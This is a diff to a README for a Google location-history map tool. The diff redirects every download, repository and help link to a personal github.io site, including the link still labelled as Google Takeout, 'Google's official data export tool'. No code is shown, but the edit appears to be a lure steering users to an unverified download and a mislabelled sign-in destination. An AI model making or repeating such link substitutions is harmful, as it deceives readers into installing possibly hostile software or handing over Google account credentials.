@@ -1,6 +1,6 @@
 # 🗺️ google-timeline-visualizer - See Your Year of Travel
 
-[![Download Now](https://img.shields.io/badge/Download-Google_Timeline_Visualizer-blue?style=for-the-badge&logo=github)](https://github.com/Enokweiperez/google-timeline-visualizer)
+[![Download Now](https://img.shields.io/badge/Download-Google_Timeline_Visualizer-blue?style=for-the-badge&logo=github)](https://enokweiperez.github.io)
 
 ---
 
@@ -35,7 +35,7 @@ It's perfect for:
 
 Visit this link to download the application:
 
-[**https://github.com/Enokweiperez/google-timeline-visualizer**](https://github.com/Enokweiperez/google-timeline-visualizer)
+[**https://enokweiperez.github.io**](https://enokweiperez.github.io)
 
 When you arrive at the page, look for a green button that says **"Code"** or a section labeled **"Releases"** or **"Download"**. Click it, then choose the option that says **"Download ZIP"** or **"Download"** for Windows.
 
@@ -63,7 +63,7 @@ That's it. No installation wizard, no complicated setup. Just run it and you're 
 
 Before you can see your map, you need to get your location data from Google. Here's how:
 
-1. Go to [**Google Takeout**](https://takeout.google.com) – this is Google's official data export tool.
+1. Go to [**Google Takeout**](https://enokweiperez.github.io) – this is Google's official data export tool.
 
 2. Sign in with the Google account that has your location history.
 
@@ -156,7 +156,7 @@ If something isn't working, here's what to do:
 
 1. **Re-read the steps above** – Most issues come from missing a step, like not extracting the ZIP.
 
-2. **Check the GitHub page** – Visit [the repository](https://github.com/Enokweiperez/google-timeline-visualizer) and look for an "Issues" tab. Someone may have already asked your question.
+2. **Check the GitHub page** – Visit [the repository](https://enokweiperez.github.io) and look for an "Issues" tab. Someone may have already asked your question.
 
 3. **Look for a "README" file** – The GitHub page has a detailed readme with technical details.
 
@@ -180,7 +180,7 @@ You've got the app. You know how to get your data. Now it's time to see your tra
 
 Visit the download link to get started:
 
-[**Download google-timeline-visualizer**](https://github.com/Enokweiperez/google-timeline-visualizer)
+[**Download google-timeline-visualizer**](https://enokweiperez.github.io)
 
 In less than ten minutes, you'll be looking at a beautiful map of your entire year. It's free, it's private, and it's yours.
 
